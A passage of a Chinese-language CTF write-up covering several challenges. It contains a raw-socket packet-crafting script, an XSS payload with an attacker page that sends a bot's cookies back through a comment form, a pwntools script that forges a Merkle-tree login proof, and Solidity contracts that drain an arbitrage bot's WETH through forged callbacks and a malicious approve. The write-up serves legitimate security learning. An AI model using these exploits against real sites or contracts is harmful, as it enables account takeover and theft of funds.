    flags = (fin | (syn << 1) | (rst << 2) | 
             (psh <<3) | (ack << 4) | (urg << 5))
    data1=struct.pack('!HHLLBBH', 
                       srcport, dstport, seq, ackseq, offset_res, 
                       flags, window)
    data2=struct.pack('!HH',0,0)
    tcplen=len(data1)+len(data2)+len(payload)
    saddr = socket.inet_aton(srcip)
    daddr = socket.inet_aton(dstip)
    checksum=calc_checksum(struct.pack('!4s4sBBH',saddr,daddr,0,socket.IPPROTO_TCP,tcplen)+data1+data2+payload)
    data2=struct.pack('!HH',checksum,0)
    return data1+data2

srcip='192.168.24.4'

dstip='192.168.23.1'
srcport=random.randint(10000,20000)#no port reuse
dstport=18082
payload = b'GET / HTTP\x00\x00'
#iptables -A OUTPUT -p tcp --sport 10000:20000 --tcp-flags RST RST -j DROP

# s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))
s.bind(("hgovpn-guest",0))


ip = make_ip(socket.IPPROTO_TCP, srcip, dstip,tlen=len(payload))
tcp = make_tcp(srcport, dstport, payload,srcip,dstip)
packet = ip +tcp + payload
s.send(packet)

#response, addr = s.recvfrom(65535)
#response_id = struct.unpack('!H', response[4:6])

while True:
    data,fr=s.recvfrom(65536)
    if len(data)<35:
        continue
    flag=data[33]
    if flag!=0x12:#SYN+ACK
        continue
    payload=b'GET / HTTP\x00\x00'+b'POST / HTTP/1.1\r\nHost: 192.168.23.1:18080\r\n'
    payload+=b"Content-Length: 100\r\n"
    payload+=(b"Content-Type: application/x-www-form-urlencoded\r\n")
    payload+=(b"\r\n")
    payload+=(b"211:114514\r\n")
    ackseq=struct.unpack('!L',data[24:28])[0]
    ip=make_ip(socket.IPPROTO_TCP,srcip,dstip,tlen=len(payload))
    tcp=make_tcp(srcport,dstport,payload,srcip,dstip,seq=1,ackseq=ackseq+1,ack=True,syn=False)
    packet=ip+tcp+payload
    s.send(packet)

    print(data.hex())

```

## 0x12 为什么要打开 /flag 😡

只做了第一问。

做法很显然。用了 LD_PRELOAD，意味着程序执行时，如果请求外部库的函数，动态链接器会优先使用题目给的 so 文件里面的 open 函数。那我们不请求外部库函数就好了。随便写一个代码，然后用 `gcc -static` 编译就好了。

第二问没做出来，属于是平时二进制做少了，技不如人甘拜下风了。

简单分析一下，利用方法应该只有几种：

- seccomp 没写对。通过 seccomp-tools dump 出原始 BPF，和网上搜索的其他 CTF 题的比较，感觉不太可能。
- 文件重定向部分没写对。当然这就是解法，但是我没看出来有 TOCTTOU 的问题。当时思考了一下，文件名可能会出问题，但是发现好像没啥问题。而发生系统调用时程序会暂停，也没法搞其他操作。只能说自己菜。
- 给出的白名单限制足够读取 flag 了。这可能包含一些通过特定方式绕过限制的方法（比如如果允许复制的话则应该可以操作软链），或者用于直接攻击 seccomp（尝试思考了下能不能直接攻击那个用于通讯 fd 的 socket，但显然本题程序权限太低了不可能）。

还是太菜了。

## 0x13 异星歧途

经典异类电路题。不难发现题目是四个相对独立的模块。让每个模块都跑起来就行。

第一个模块有一个逻辑处理器，点开可以看到执行的代码。不难发现这个代码就是判断每个开关的取反。随手构造一下。

第二个模块也是一个逻辑处理器，但是是比较复杂的程序了。稍微看一下不难发现，是个平方数检测的函数，且限制了某两位的值。不难得到答案。

第三个模块是要让整个产线运行起来。操作不小心的话会炸。根据工厂类游戏的思路，随便搞一搞，供货和机器的开关打开，分流的调一调，多试几次不难得到。

第四个模块是一个用机器原件实现的电路。具体是什么电路我也懒得看，大概是利用电力供应和机器启停情况构造了一些与门非门啥的。而电路本身并没有复杂的约束，就是一个顺序计算组合电路。总之我们开启状态显示的选项后，不难直接手动根据全局状态差分来构造出输入。

最终答案 `10100101110001001000110001110111`

## 0x14 微积分计算小练习 2.0

不是特别难的 XSS 题，不过我还是做了一阵，还是我太菜了。

点开网页，我们不难发现 XSS 点：我们写入的评论是以直接拼接的方式写到文末的 js 内的，之后再由 js 写入 DOM。经过简单的测试，我们可以直接使用 `"+x+"` 的方式来写入任意内容或者执行函数。但问题是怎么执行函数。题目给的条件限得比较死，直接使用括号或者反引号均不行，而用更复杂的方法的话很难不爆长度限制。但同时结合题目条件，我们可以开一个外部的网页服务器，不难猜出这个要具体执行的脚本可以由外部写入（这样顺便还能绕字符限制）。XSS 中有一个经典的方法，就是  `location.href="javascript:alert()"` ，这块我们也可以使用。注意到题目中过滤了点，但其实没什么乱用，我们可以使用 `location["href"]` 访问。因此在网页上发送一个 `"+[location["href"]=x]+"` 就可以执行。注意到运算符优先级问题，我们需要把他包起来。

不过这样还是太长了。而且我们还没有解决怎么传入 x 的问题。经过随意的测试，发现直接用 `location=x` 就可以进行跳转。那么我们就只需要解决怎么传入 x 的问题了。

显然我们触发 XSS 的流程是，Bot 浏览我们的网站后，通过某种方式跳转到题目网页，之后再执行评论中被注入的 js，主动提交 flag。于是最开始我上网搜，XSS 怎么跨域传信息，有一套基于 frame 的想法（虽然大概不太 work）。然后我又想到，我们可以通过给链接加 query string，或者加 tag，但是网页拿到自己的这些信息都必须使用 `location.?` 的方法，又超长了。后来结合题目非常显著的 "popup" 的提示，稍微搜了一下，不难发现，`window.open` 还有第二个参数 `target`，而打开之后的窗口，可以通过 `window.name` 来获取打开它的第二个参数，而测试一下也不难发现前面的 `window` 也可以删掉。

因此我们得到最终 payload 和流程：我们人工在评论网页上留个恶意 js，之后跑 Bot 执行构造的网页。Bot 访问网页后自动打开评论页面，然后执行 js。这个 js 再通过提交评论把读取到的 cookie 回显。注意这块最好编码一下再提交，不然可能会被过滤。

```
"+[location=name]+"
```

```html
<html>
    <body>
        <script>
            window.open("http://web/result","javascript:document.querySelectorAll(\"#comment\")[1].value=btoa(document.cookie.substring(0,15));document.getElementsByTagName(\"button\")[0].click();")
        </script>
    </body>
</html>
```

注意到题目说 flag 比较长，因此我们一次只发一个字串，然后搞多次。做完了交 flag，说错了，才知道后面的补充提示是什么意思，，

## 0x15 逆向工程不需要 F5

没做的题。掏出 IDA debugger，简单看了一下执行流程和 dll 的汇编，发现流程不难。但是似乎比较难去自动逆向（通过合并 dll 啥的，我以为 IDA 对 win 动态链接的支持不行，没想到是题目特殊处理了）。但考虑到尽管流程不难，手动逆向也需要一两个小时，就咕了。本来寻思着如果做出来其他题能上分了再顺手一做然后提个排名（没想到还有囤 flag 的）。

关于题解提到的 angr，我也试了，但我也实在是不会 angr，直接复制的前几年 hackergame 那个自动逆向题的脚本，果然没跑出来。想着如果用高级的模拟执行手段可能也行，但反正也得花时间学，不如上手逆~~（或者咕了）~~。

## 0x16 O(1) 用户登录系统

很有意思的背景。

看到 Merkle Tree，不难想（或搜）到 Merkle Tree 的经典问题：不检查深度（或者说 proof 长度）。

这就导致了一个合法的 proof，证明的元素并不一定是之前插入的叶子节点。而具体地有两种攻击方式：截取更短的 proof，证明中间节点；添加更长的 proof，证明在原叶子节点下强行增加的节点。

对于本题来讲，采用的是第二种攻击方式（好像见别人出过）。对于第一种的话，不难发现我们需要使得两个叶子节点的 hash 拼接后作为假的叶子节点，把假叶子节点提交，因此这个假叶子节点需要以 `admin:` 开头，攻击成本至少是 $256^6$，有点高了。

第二种的话，不难发现我们是需要在注册的过程中插入一个账号作为叶子节点，同时这个节点恰好也可以从两个假叶子节点 hash 算出，而这两个假叶子节点其中一个应该是以 `admin:` 开头的。不难发现这个构造方法（看起来）连枚举都不需要，直接随便选取一个 `admin:` 的账号作为假叶子节点，再随便选取一个账号作为另外一个假叶子节点，之后算一下他们的 hash 拼接一下，作为提交的叶子节点就行了。但这时候我们还有一个要求，就是这个从 hash 拼接成的叶子节点，必须也恰好是一个可以被账户表示的串（这样才能被当成合法的叶子节点插入进去）。这个要求也不难，只要最终两个 hash 拼接的串含有恰好一个冒号就好了。

但写了之后发现，我们提交的串（即两个叶子）应当是一个能被 UTF-8 合法解码的串，并且不含换行（最开始忘了判了）。但反正枚举量也不大，随便写一下就好了。

```python
from hashlib import sha1
from itertools import product
from string import ascii_lowercase, digits

def crack_sha1():
    charset = ascii_lowercase + digits
    rets=[]
    sb="admin:"
    for i in product(charset, repeat=4):
        s=sb+''.join(i)
        sh=sha1(s.encode()).digest()
        try:
            u=sh.decode().encode()
            assert u==sh
            assert not b'\n' in u
        except:
            continue
        sb=s
        break

    sh=sha1(sb.encode()).digest()
    print(sb,sh)
    for i in product(charset, repeat=4):
        s = ''.join(i)
        rt=sha1(s.encode()).digest()
        hash1, hash2 = (rt,sh) if rt < sh else (sh,rt)
        # print(hash1.hex(),hash2.hex())
        # r=sha1(hash1 + hash2).digest()
        r=hash1+hash2
        if b":" in r:
            try:
                u=r.decode().encode()
                assert u==r
                assert r.count(b":")==1
                # print("hits",r)
                assert not b'\n' in r#male
            except:
                continue
            rets.append((sb,s,r,rt))
    return rets

# print(crack_sha1())

from pwn import *

# r=process("python3 o1login.py",shell=True)

r=remote("202.38.93.111",10094)

r.sendline(b"211:114514")

res=crack_sha1()

print(res)

bb=[b"aaa:aaa",b"bbb:bbb",b"ccc:ccc"]

ad,_,bp,hs=res[0]

print(bp.hex(),hs.hex())

print(sha1(bp).hexdigest())#check

bb=[bp]+bb

r.recvuntil(b"Choice: ")
r.sendline(b"1")

for i in bb:
    r.sendline(i)

r.sendline(b"EOF")

r.recvuntil(b"Login credentials:")
r.recvuntil(b":")
r.recvuntil(b":")
crd=r.recvline().strip().decode()
print(crd)

rcrd=ad+":"+hs.hex()+crd

print(rcrd)

r.interactive()
```

## 0x17 链上猎手

非常好背景链题。这题背景还是挺有意思的，就是对于不太了解 DeFi 的朋友可能经过短时间学习也比较难做出第二问和第三问（甚至不一定能看明白题解）

题目背景就是一个 MEV Bot，用于执行自动化链上套利。同时 Bot 的合约里面存了一些 WETH，用于套利本金。而题目目标就是，在三个任务的不同实现中把合约的钱掏空。

我们不难发现，这三个任务合约和脚本实现是越来越复杂的，但主要区别都在发交易和交易处理的部分（检测套利之类的是一致的）。

因为我们是要掏合约，所以先从合约入手。对于一个正常执行套利的交易，交易流程应该是：脚本发送一条交易，调用合约的 arbitrage 函数，arbitrage 去调用第二个 pair，之后第二个 pair 给他转出他要购入的 Token（即 WETH），并给合约进行 uniswapV2Call 回调，让合约给他转一笔钱（在这个回调完成后，第二个 pair 会去检查它转的钱数量对不对，如果不对就撤销整个交易，进而前面的转账也会被撤销，就不会被骗钱了；如果你选择在发送交易请求前先转钱也是可以的，不一定要在回调的地方转）。uniswapV2Call 收到回调请求后，会去拿刚刚收到的 WETH 转到第一个 pair 并发起交易，从这里面购入另外一个 Token，并让他直接发送到第一个 pair 中。之后结束回调，第一个 pair 检查出自己收到的钱数量正确，成功退出。此时我们从第一个 pair 收到的 WETH 数量和发送给第二个 pair 的不一致，因此成功完成了一个套利流程，赚到了钱。了解流程之后就可以看题了。

先看第一题。不难发现，会发生 WETH 转移的地方只有两个，一个是 uniswapV2Call，另外一个是 withdraw。而 withdraw 的约束比较简单，直接检查了发送消息的人是不是 owner，显然是没法绕过的。而 uniswapV2Call 虽然检查了一堆条件，但不难发现都非常脆，没有做本质上的检查（发起者是到底是不是真的 pair）。第一个检查是，调用发送者的 factory 函数，看他返回的值是不是允许的 pair 创建者的值。第二个是传入的合约参数 sender 是不是自己（正常情况下这表明给 pair 发送的 swap 请求是由自己的 arbitrage 函数发出的）。后面的 require 只是纯纯的用来检查是否转账成功的。

因此我们不难去构造恶意的合约。我们直接写一个合约，伪造自己是 pair。当对面询问 factory 时，直接返回一个合法地址假装是它创建的就好（这块我们直接使用一个 public 变量）。而 sender 参数随便喂一个就好。注意到题目合约可能会产生其他回调，因此再随便写点 fallback 函数。

```solidity
contract hack
{
    address public factory;
    address weth;
    constructor(address fac,address we)
    {
        weth=we;
        factory=fac;
    }
    function work(address payable to) public 
    {
        address t1=address(this);
        uint256 amo=IERC20(weth).balanceOf(to);
        Bot(to).uniswapV2Call(to,0,0,abi.encode(t1,t1,amo,0,0));
    }

    fallback() external payable { }
    receive() external payable { }
}
```

再看第二题。我们发现第二题写了一个 simulate 函数，在合约内检查了一次交易是否是"成功的套利"，即合约的钱是否增加了。同时 uniswapV2Call 函数的判定也严格了，直接判的是 tx.origin，即交易的签名方必须是 owner。这就意味着我们不能通过自己发交易的方式来骗钱了，只能先骗 Bot 的套利脚本，然后让他发送一个可以被骗走钱的交易。但同时我们也要知道，这个检查还是没有解决上述的本质问题，即验证消息的发送者是否是真正的 pair。因此我们可以构造一个恶意的 Token 合约，当套利者亲自发送交易试图套利的时候，我们让这个恶意的 Token 合约在某个过程中用上一问的方法再调用一下 uniswapV2Call，便可以忽悠他转钱了。

但我们看套利脚本，不难发现这个套利实际上是分为两步的：先使用 call 调用 simulate 对要发送的交易进行模拟。如果模拟成功了，再发送实际的交易 arbitrage 来进行套利。这也就意味着，如果我们要构造一个恶意的请求的话，必须要先让它在链下调用 simulate 模拟的时候不会被骗走钱，但上链发送 arbitrage 会被骗走钱。

区分链上真实环境和链下模拟环境其实有很多方法。我这块看到两个调用的函数不同，就想到了一种非常直接的判断方法：判断 gas。调用 simulate 会先去查询 balanceBefore，而 arbitrage 没有，消耗的 gas 比较少。因此当链上交易执行到我们的恶意代码部分的时候，剩余的 gas 就会比链下模拟的多（当然也是因为他本地模拟的参数和上链的参数一样；否则显然我们有更简单的方法去判了）。我们可以先写好一坨代码，然后使用 event 输出一下调用 arbitrage 时执行到那一块的 gas，本地开个链模拟一下就可以得到使用 arbitrage 方法时到底会剩多少 gas，之后再改一下代码里面的常数就好了。

接下来就是如何构造恶意 Token 合约的细节了。简单回顾一下流程就会发现，正常执行时只会执行一次非 staticcall 请求，也就是在 uniswapV2Call 回调后，请求 pair1 交易把 Token 转回 pair0 的流程，是由 pair1 调用 transfer 方法。注意到这时候 WETH 已经完成全部结算了，因此我们在 transfer 内，判断完是否是真实交易后，直接获取 Bot 合约 WETH 的余额，之后构造恶意请求调用 uniswapV2Call 让 Bot 把钱转走就好了（注意这时候可能还是会发生一些其他回调，所以我们还是让他调我们自己写的带有 fallback 方法的合约好）。当然我们需要提前存一下自己的合约和 Bot 合约的地址。

注意到在构造的时候，必须让 Bot 先能检测到套利情况。因此我们还需要再开两个交易对，转一些不平衡的钱。在初始化好 Token 和交易对后坐等 Bot 上钩即可。

```solidity
pragma solidity =0.8.21;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function factory() external view returns (address);
    function mint(address to) external returns (uint liquidity);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function withdraw(uint256) external;
    function deposit() external payable;
}

contract Bot {
    IWETH immutable WETH;
    address payable immutable owner = payable(msg.sender);
    address immutable FACTORY1;
    address immutable FACTORY2;

    constructor(IWETH weth) payable {
        WETH = weth;
        require(msg.value == 1 ether);
        WETH.deposit{value: msg.value}();
    }

    function arbitrage(IUniswapV2Pair pair1, IUniswapV2Pair pair2, uint amount1, uint amount2, uint amount3, bool dir) external {
        require(msg.sender == owner, "sender");
        pair2.swap(dir ? 0 : amount3, dir ? amount3 : 0, address(this), abi.encode(pair1, pair2, amount1, amount2, dir));
    }

    function simulate(IUniswapV2Pair pair1, IUniswapV2Pair pair2, uint amount1, uint amount2, uint amount3, bool dir) external {
        require(msg.sender == owner, "sender");
        uint balanceBefore = WETH.balanceOf(address(this));
        pair2.swap(dir ? 0 : amount3, dir ? amount3 : 0, address(this), abi.encode(pair1, pair2, amount1, amount2, dir));
        require(WETH.balanceOf(address(this)) > balanceBefore, "balance");
    }

    function uniswapV2Call(address, uint, uint, bytes calldata data) external {
        require(tx.origin == owner, "origin");
        (IUniswapV2Pair pair1, IUniswapV2Pair pair2, uint amount1, uint amount2, bool dir) = abi.decode(data, (IUniswapV2Pair, IUniswapV2Pair, uint, uint, bool));
        require(WETH.transfer(address(pair1), amount1));
        pair1.swap(dir ? amount2 : 0, dir ? 0 : amount2, address(pair2), '');
    }

    function withdraw() external {
        require(msg.sender == owner, "sender");
        WETH.withdraw(WETH.balanceOf(address(this)));
        owner.transfer(address(this).balance);
    }

    receive() external payable {}
}

contract HToken {
    string constant public name = "Token";
    string constant public symbol = "T";
    uint8 constant public decimals = 18;
    uint constant public totalSupply = 100 ether;
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;

    bool public env=false;
    address public wethaddr;
    address public hackaddr;
    address payable public botaddr;
    event gasv(uint);//0x5e24efb52bbd23cf7587727df0e80d0cedc7e84bb3d3f473b33da1c03fa12282

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function transfer(address to, uint value) public returns (bool) {
        uint256 gs=gasleft();
        emit gasv(gs);
        if(gs>0xd17a0 && gs<0xd1800)
        {
            env=true;
            address t1=hackaddr;
            uint256 amo=IERC20(wethaddr).balanceOf(botaddr);
            Bot(botaddr).uniswapV2Call(botaddr,0,0,abi.encode(t1,t1,amo,0,0));
        }

        _transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint value) public returns (bool) {
        require(allowance[from][msg.sender] >= value);
        allowance[from][msg.sender] -= value;
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address from, address to, uint value) private {
        require(balanceOf[from] >= value);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
    }

    function setenv(bool x) public 
    {
        env=x;
    }

    function setp(address weth,address hacks,address bots) public
    {
        wethaddr=weth;
        hackaddr=hacks;
        botaddr=payable(bots);
    }
}


contract hack
{
    event gasv(uint);
    IUniswapV2Factory factory1;
    IUniswapV2Factory factory2;
    IWETH public weth;
    HToken public token;
    IUniswapV2Pair public pair1;
    IUniswapV2Pair public pair2;
    address public botaddr;
    constructor(address fac1,address fac2,address we,address bots)
    {
        weth=IWETH(we);
        factory1=IUniswapV2Factory(fac1);
        factory2=IUniswapV2Factory(fac2);
        botaddr=bots;
    }
    function work() public payable
    {
        require(msg.value==0.2 ether);
        token=new HToken();

        pair1 = IUniswapV2Pair(factory1.createPair(address(weth), address(token)));
        pair2 = IUniswapV2Pair(factory2.createPair(address(weth), address(token)));
        weth.deposit{value: msg.value}();

        require(weth.transfer(address(pair1), 0.1 ether));
        require(token.transfer(address(pair1), 1 ether));
        pair1.mint(address(this));

        require(weth.transfer(address(pair2), 0.1 ether));
        require(token.transfer(address(pair2), 10 ether));
        pair2.mint(address(this));

        token.setp(address(weth),address(this),botaddr);
    }

    fallback() external payable { }
    receive() external payable { }
}
```

最后看第三问。第三问不区分上链和模拟了，在所有套利请求后都会检查合约的 WETH 余额是否增加，看起来是更安全了，但同时在其他地方也进行了修改，反而更危险了。不难发现，这个任务中，对其他合约发起请求的部分，从原来的请求固定方法，变成了请求任意地址的任意方法。其直接使用函数参数的 address 和 calldata 作为要发送的交易请求的目标地址和参数，而我们仍然能对 uniswapV2Call 函数做任意调用（只要这个交易是 Bot 自己签的），进而让这个合约发送任意交易。具体产生恶意调用的方式和上一问一样。

尽管在最外层的 arbitrage 判断了余额，使得我们不能在里面的恶意请求内直接转走钱。但如果你在 DeFi 浸淫多年的话，很难不听说过 approve 攻击（虽然通常都是在钓鱼或者某些项目可能被黑后恶意利用）。而这题我们也可以使用 approve 方法，这个方法表示授权某个地址花费我们的某个 Token 的权限（但是发生授权时并不会有代币转出；如果你好奇为什么要设计这么个逻辑，可以去看一下 DeFi 合约都是怎么从用户进行 Token 转账的）。我们利用 uniswapV2Call，让合约给 WETH 发送一个恶意的 approve 请求，使得 Bot 合约授权给我们恶意合约的消费权限。这样我们就可以在 Bot 执行完后，再发送一个交易，把 Bot 的 WETH 转走了。

```solidity
pragma solidity =0.8.21;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function factory() external view returns (address);
    function mint(address to) external returns (uint liquidity);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender,address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function withdraw(uint256) external;
    function deposit() external payable;
}

contract Bot {
    IWETH immutable WETH;
    address payable immutable owner = payable(msg.sender);

    constructor(IWETH weth) payable {
        WETH = weth;
        require(msg.value == 1 ether);
        WETH.deposit{value: msg.value}();
    }

    function arbitrage(address[] calldata addressList, bytes[] calldata calldataList) external {
        require(msg.sender == owner, "sender");
        uint balanceBefore = WETH.balanceOf(address(this));
        require(addressList.length == calldataList.length);
        for (uint i = 0; i < addressList.length; i++) {
            (bool success, ) = addressList[i].call(calldataList[i]);
            require(success);
        }
        require(WETH.balanceOf(address(this)) > balanceBefore, "balance");
    }

    function uniswapV2Call(address, uint, uint, bytes calldata data) external {
        require(tx.origin == owner, "origin");
        (address[] memory addressList, bytes[] memory calldataList) = abi.decode(data, (address[], bytes[]));
        require(addressList.length == calldataList.length);
        for (uint i = 0; i < addressList.length; i++) {
            (bool success, ) = addressList[i].call(calldataList[i]);
            require(success);
        }
    }

    function withdraw() external {
        require(msg.sender == owner, "sender");
        WETH.withdraw(WETH.balanceOf(address(this)));
        owner.transfer(address(this).balance);
    }

    receive() external payable {}
}

contract HToken {
    string constant public name = "Token";
    string constant public symbol = "T";
    uint8 constant public decimals = 18;
    uint constant public totalSupply = 100 ether;
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;

    bool public env=false;
    address public wethaddr;
    address public hackaddr;
    address payable public botaddr;
    event gasv(uint);//0x5e24efb52bbd23cf7587727df0e80d0cedc7e84bb3d3f473b33da1c03fa12282

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function transfer(address to, uint value) public returns (bool) {
        uint256 gs=gasleft();
        emit gasv(gs);
        if(gs>0 && gs<0xf1800)
        {
            env=true;
            address t1=hackaddr;
            address[] memory addressList=new address[](1);
            bytes[] memory calldataList=new bytes[](1);
            addressList[0]=wethaddr;
            calldataList[0]=abi.encodeCall(IERC20.approve, (hackaddr,666 ether));
            Bot(botaddr).uniswapV2Call(botaddr, 0, 0, abi.encode(addressList,calldataList));
            // uint256 amo=IERC20(wethaddr).balanceOf(botaddr);
            // Bot(botaddr).uniswapV2Call(botaddr,0,0,abi.encode(t1,t1,amo,0,0));
        }

        _transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint value) public returns (bool) {
        require(allowance[from][msg.sender] >= value);
        allowance[from][msg.sender] -= value;
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address from, address to, uint value) private {
        require(balanceOf[from] >= value);
        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
    }

    function setenv(bool x) public 
    {
        env=x;
    }

    function setp(address weth,address hacks,address bots) public
    {
        wethaddr=weth;
        hackaddr=hacks;
        botaddr=payable(bots);
    }
}


contract hack
{
    event gasv(uint);
    IUniswapV2Factory factory1;
    IUniswapV2Factory factory2;
    IWETH public weth;
    HToken public token;
    IUniswapV2Pair public pair1;
    IUniswapV2Pair public pair2;
    address public botaddr;
    constructor(address fac1,address fac2,address we,address bots)
    {
        weth=IWETH(we);
        factory1=IUniswapV2Factory(fac1);
        factory2=IUniswapV2Factory(fac2);
        botaddr=bots;
    }
    function work() public payable
    {
        require(msg.value==0.2 ether);
        token=new HToken();

        pair1 = IUniswapV2Pair(factory1.createPair(address(weth), address(token)));
        pair2 = IUniswapV2Pair(factory2.createPair(address(weth), address(token)));
        weth.deposit{value: msg.value}();

        require(weth.transfer(address(pair1), 0.1 ether));
        require(token.transfer(address(pair1), 1 ether));
        pair1.mint(address(this));

        require(weth.transfer(address(pair2), 0.1 ether));
        require(token.transfer(address(pair2), 10 ether));
        pair2.mint(address(this));

        token.setp(address(weth),address(this),botaddr);
    }

    function works() public payable
    {
        uint amo=IERC20(weth).balanceOf(botaddr);
        weth.transferFrom(botaddr,address(this),amo);
    }

    fallback() external payable { }
    receive() external payable { }
}
```

## 0x18 It's MyCalculator!!!!!

没做出来的题。虽然差的不多，但还是自己菜，平时做 bin 做少了。

首先做这题最好上过编译原理课，不然可能连这两个文件都看不懂。当然，在假设 flex 和 bison 足够安全之后，可能的危险点只有涉及到数组操作的部分，数量非常少。仔细看一下我们不难发现 bug 所在：尽管在 GET 和 PUT 内检查了是否越界，但是这个越界只判了单边；而当我们输入一个负数的时候，就会发生越界。但同时我们又注意到，这题的解析规则不支持负数，但是这并不重要，因为我们可以直接构造大整数越界，直接使用 `2**32-x` 就好。这意味着我们获得了 buffer 数组到前 `2**34` 字节的访问权限。

之后掏出 IDA，执行以下，看看上面都是些啥。首先这个 buffer 数组在 .bss 开头部分，上面紧挨着就是 GOT 表之类的东西。之后还有一些杂的 .fin 小东西。由于开了保护，具有可写权限的非常少，基本上只有 GOT 表本体。再网上就是只读的 code 区了。

注意到表里面存了 stderr 之类的文件，我们不难结合偏移泄露出 libc 的基址。之后这就意味着我们可以覆写 GOT 表做任意跳转了。

之后大力试试 one_gadget，结果发现执行条件太严格了，所有调用 libc 的地方都不满足执行条件。因此必须要考虑怎么手动覆写参数。

之后我就蒙古了。最开始寻思着内存保护应该是以 segment 或者 page 为单位进行的，因此 GOT 表开头的那一坨 ld 参数应该也是能修改的，进而当发生未被链接的函数调用时，就会调用到这一块，然后我们就能控制栈上的一个数，之后 pop rsp 来完成 ROP 了。后来发现还是我 naive 了，原来 GOT 表开头那两个控制 ld 参数的内存也是被保护的，无法修改。之后再考虑有哪些参数是可控的，结果发现所有的参数都是不可控的：要么是 rodata 里面的静态串，要么是写在不可达地址的东西（例如 fprintf 调用的 stderr，在高地址的 glibc 下）。于是就自闭了，以为要使用特别复杂的控制流调到某个特定的地方。比如我发现 r14 寄存器似乎离我们可以操作的 buffer 很近，可以利用一下看看能不能写到 rsp 里面，但是这样找 gadget 就比较麻烦了。

后来看了题解发现，确实是思维盲区了。大概有两个地方没想到。一个是忘了我们不一定要亲自写入：我们可以先劫持 fprintf 为 gets，然后用 stdin 完成对应地址的写入。另一个是 stderr 也是动态链接的，因此我们只需要改一下 GOT 表项换到其他地址，然后就可以做任意修改了。

## 0x19 小 Z 的谜题

比较有意思的题。我们先分析每一步的检查条件分别是什么。

第一个条件就是输入。只要我们的输入是合法的就行。这意味着我们总共需要输入 16 组元素，每一组 6 个值写成 2x3 矩阵，每个值的范围是 0 到 5。注意到这意味着每一个元素的可能性非常少，只有 $6^6=46656$。而后续的约束会更进一步缩减规模（最后只有大概一千个）。

第二个条件是排序。这要求我们的输入是有序的。注意到前后的其他检查都是顺序无关的，因此我们也不需要考虑这个条件。只需要在满足其他条件后，再单独排一下序就好。

然后看第三个条件：唉我草这啥玩意。算了，先不看 any 这一坨了，总之就是选的 16 个元素里面，元素之间两两之间有边（就是这个 any 里面判定的条件）。

再看最后一个条件：我们先把左边 sorted 那一坨看成一个函数 F(x)，这就要求我们的 16 个元素中，每一个元素的 F(x) 一定要是 constraints 中出现，即找到对应的分类，且每个分类最后算下来的元素个数恰好和 count 中的相等。

注意到最后一个条件其实有一个隐藏性质：里面算的 `arrange[i][j][1] - arrange[i][j][0]` 必须是大于 0 的。这也就意味着每一行第二个元素一定大于第一个元素。而外面的这个 sorted，就意味着这三行是可交换的，即交换不同行不影响分类。

我们有了这个每一行第二个元素一定更大的性质后，再去回看第三个条件。这意味着对于任意的两个元素，我们看他们对应的三行，要求一定至少要有一行（any）满足，某一个元素的该行的最大值，小于或等于另外一个元素该行的最小值。

如果对计算几何比较熟悉的朋友已经反应过来了，这不就是 Box 碰撞判定吗。每一个元素表示一个三维空间下的 Box，有边即表示不冲突。而最后一个条件意味着每一个 Box 的形状是固定的，但他是可旋转的（对应三行可交换）。同时每个 Box 必须在 $[0,5]^3$ 的空间内

如果没有反应过来也暂时没有关系。至少我们用上面的那个有边的判定条件，直接去枚举所有可行的元素和可行的边，不考虑分数的条件，那么这题就变成了一个最大团问题。因为我比较懒，所以我用了混合编程。先使用 python 生成了一下所有可行的节点和边，之后再使用 cpp 搜索最大团。

但是很不幸的，我们做一些简单的优化并不能改变搜不出来的事实，观测发现几乎每次都在倒数第二层退出掉了，因此我猜测是一个非常紧的条件。于是我返回去思考约束的含义。对所有条件都有一个大概的理解后不难发现上述的三维平铺问题。然后我们再算一下这个条件有多紧：所有 Box 的体积加起来居然恰好是 125，是完全密铺问题。

既然我们已经知道是完全密铺问题了，那么其实我们不难做一个效果显著的优化：我们规定搜索的时候，必须是尝试顺序密铺，即下一个方块必须是扫描顺序的第一个未被占用的空块。加了之后可以在不到一秒内搜出所有的 flag。

在具体写的时候还是有一些小优化的：比如我们可以对每个点再维护一下，可以从这个点开始密铺的 Box 有哪些，可以减少枚举复杂度；判冲突的时候不是往前枚举和哪个 Box 冲突了，而是动态维护一下空间里面有哪些位置被占用了。别的就没什么要做的优化了。

算分的时候，我们可以直接把 -1 换成 6，然后用类似字符串哈希的方法编码到一个数字，之后简单判断一下不重复的个数就好了。

